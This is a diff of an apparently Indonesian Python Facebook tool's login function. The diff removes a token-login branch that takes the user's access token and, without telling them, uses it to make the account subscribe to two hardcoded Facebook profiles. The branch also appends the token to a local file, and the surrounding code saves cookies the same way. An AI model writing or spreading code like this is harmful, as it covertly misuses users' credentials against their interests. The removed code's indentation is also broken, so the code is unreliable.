@@ -320,19 +320,6 @@ def login():
 		  nama = jsx["name"]
 		  input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
 		  open("data/save.txt","a").write(cookie);Data(cookie,nama).menu()
-    elif bingung in ("02","2"):
-          __token = input("[?] token\t: ")
-        try:
-          __res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
-          _nama = __res['name']
-          _id = __res['id']
-          req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
-          req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
-          input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
-          open("data/save.txt","a").write(__token)
-          Data(__token, _id, _nama).menu()
-          except KeyError:
-            print("\n[!] token invalid")
 	
 	
 if __name__=="__main__":
